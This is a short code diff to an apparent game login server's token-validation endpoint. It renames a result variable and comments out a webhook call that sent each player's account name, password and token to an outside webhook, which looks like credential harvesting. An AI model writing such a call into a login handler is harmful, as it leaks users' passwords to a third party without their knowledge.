@@ -188,7 +188,7 @@ App.post('/player/growid/validate/checktoken', (req: Request, res: Response) => 
     const Data = Device.Packet(Context);
     const Token = Parsing.Encode(JSON.stringify(Data));
 
-    const result = {
+    const Result = {
         status: 'success',
         message: 'Account Validated.',
         Token,
@@ -197,8 +197,8 @@ App.post('/player/growid/validate/checktoken', (req: Request, res: Response) => 
         accountAge: 2,
     };
 
-    Webhook.Send(req, Data['tankIDname'] || '', Data['tankIDPass'] || '', Token);
-    res.send(JSON.stringify({ result }));
+    //Webhook.Send(req, Data['tankIDname'] || '', Data['tankIDPass'] || '', Token);
+    res.send(JSON.stringify({ Result }));
 });
 
 App.listen(Port, () => {
